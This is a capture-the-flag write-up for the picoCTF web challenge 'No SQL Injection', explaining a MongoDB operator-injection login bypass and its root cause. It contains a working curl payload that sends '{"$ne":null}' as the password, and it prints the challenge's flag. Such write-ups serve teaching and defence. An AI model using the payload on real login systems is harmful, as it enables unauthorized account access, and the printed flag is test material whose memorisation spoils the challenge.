# No SQL Injection

**Platform:** CyLab Security Academy (picoCTF)
**Category:** Web Exploitation
**Difficulty:** Medium
**Flag:** `picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_784e40e8}`

## Summary

An Express/Mongoose login endpoint deliberately parses the `email` and `password` fields as JSON
whenever their string value looks like an object (starts with `{`, ends with `}`), then passes
the result directly into `User.findOne(...)`. Submitting a MongoDB query operator instead of a
real password (`{"$ne": null}`) turns the password half of the query into "not equal to null,"
which matches any real password value, bypassing authentication for a known account without
knowing its actual password.

## Discovery

The full source is provided. The vulnerable query construction:

```javascript
const user = await User.findOne({
  email: email.startsWith("{") && email.endsWith("}") ? JSON.parse(email) : email,
  password: password.startsWith("{") && password.endsWith("}") ? JSON.parse(password) : password,
});
```

Any field can be swapped for an arbitrary MongoDB query operator simply by sending a
JSON-looking string for it. The user schema also defaults every new account's `token` field to
the literal placeholder `"{{Flag}}"`, and a seeded account (`picoplayer355@picoctf.org`) is
created automatically at server startup, giving a known target email to authenticate as.

## Proof of Concept

The value must be a JSON **string** containing the operator text (so `.startsWith`/`.endsWith`
succeed before `JSON.parse` runs), not a nested JSON object, since the request body itself is
already parsed as JSON by `body-parser`:

```
curl -s -X POST http://TARGET/login \
  -H "Content-Type: application/json" \
  -d '{"email":"picoplayer355@picoctf.org","password":"{\"$ne\":null}"}'
```

```json
{"success":true,"email":"picoplayer355@picoctf.org","token":"cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzc4NGU0MGU4fQ==", ...}
```

The returned `token` is base64 encoded:

```
echo "cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzc4NGU0MGU4fQ==" | base64 -d
picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_784e40e8}
```

## Root Cause

User-controlled input is passed directly into a database query's operator position instead of
its value position. MongoDB (and other document databases with a rich query DSL) treat query
operators and literal values as structurally different, and any code path that lets a client
choose which one applies collapses "check this field equals a secret the client doesn't know"
into "let the client pick any comparison it wants."

## CWE / OWASP

- **CWE-943**: Improper Neutralization of Special Elements in Data Query Logic (NoSQL Injection)
- **CWE-287**: Improper Authentication
- **OWASP A03:2021**: Injection
